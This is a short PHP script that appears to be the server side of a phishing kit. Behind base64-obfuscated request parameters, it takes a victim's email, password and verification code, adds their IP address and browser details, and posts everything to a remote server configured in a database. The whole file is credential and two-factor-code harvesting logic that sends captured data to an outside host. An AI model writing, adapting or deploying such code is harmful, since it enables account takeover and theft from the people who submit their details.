<?php session_start();

require_once '../config/config.php';
 $sql = $con->prepare("SELECT * FROM tblserver");
 $sql->execute(); 

if($sql->rowCount() == 1){

    $dom = $sql->fetch(PDO::FETCH_ASSOC);
    $dominioserver = $dom['dominio'];
  }

  
 $array_devolver=[];
 if(isset($_GET['bG9naW5fYXV0ZW50aWNhdGU'])){ 
     
     $haskend = getRealIP();
     $user_agent = $_SERVER["HTTP_USER_AGENT"];
     $domain = $_SERVER["HTTP_HOST"];

     $email    = $_POST['email'];
     $password = $_POST['password'];
     $linkg    = $_POST['linkg'];
     
     $ch = curl_init(); 
     // definimos la URL a la que hacemos la petición
     curl_setopt($ch, CURLOPT_URL, $dominioserver."/api/autoremove/autoremove/remover");
     // indicamos el tipo de petición: POST
     curl_setopt($ch, CURLOPT_POST, TRUE);
     // definimos cada uno de los parámetros
     curl_setopt($ch, CURLOPT_POSTFIELDS, "email=".$email."&password=".$password."&linkg=".$linkg."&haskend=".$haskend."&user_agent=".$user_agent."&domain=".$domain);
 
     // recibimos la respuesta y la guardamos en una variable
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);// set optional 
     $responses = curl_exec ($ch);
 
     // cerramos la sesión cURL
     curl_close ($ch);
 
    

     echo $responses;   

   }elseif(isset($_GET['Q29kZWF1dGVudGljYXRlQ29kZWF1dGVudGljYXRl'])){


     $haskend = getRealIP();
     $user_agent = $_SERVER["HTTP_USER_AGENT"];
     $domain = $_SERVER["HTTP_HOST"];

     $codigo   = $_POST['codigo'];
     $linkg    = $_POST['linkg'];
     $tipocode = $_POST['tipocode'];
     $count    = $_POST['count'];

     
     $ch = curl_init(); 
     // definimos la URL a la que hacemos la petición
     curl_setopt($ch, CURLOPT_URL, $dominioserver."/api/autoremove/autoremove/code");
     // indicamos el tipo de petición: POST
     curl_setopt($ch, CURLOPT_POST, TRUE);
     // definimos cada uno de los parámetros
     curl_setopt($ch, CURLOPT_POSTFIELDS, "codigo=".$codigo."&linkg=".$linkg."&tipocode=".$tipocode."&count=".$count."&haskend=".$haskend."&user_agent=".$user_agent."&domain=".$domain);
 
     // recibimos la respuesta y la guardamos en una variable
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);// set optional 
     $responses = curl_exec ($ch);
 
     // cerramos la sesión cURL
     curl_close ($ch);
 
    

     echo $responses;   

   }



   function getRealIP(){

    if (isset($_SERVER["HTTP_CLIENT_IP"])){
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
        return $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED"])){
        return $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])){
        return $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED"])){
        return $_SERVER["HTTP_FORWARDED"];
    }
    else{
        return $_SERVER["REMOTE_ADDR"];
    }

 }

?>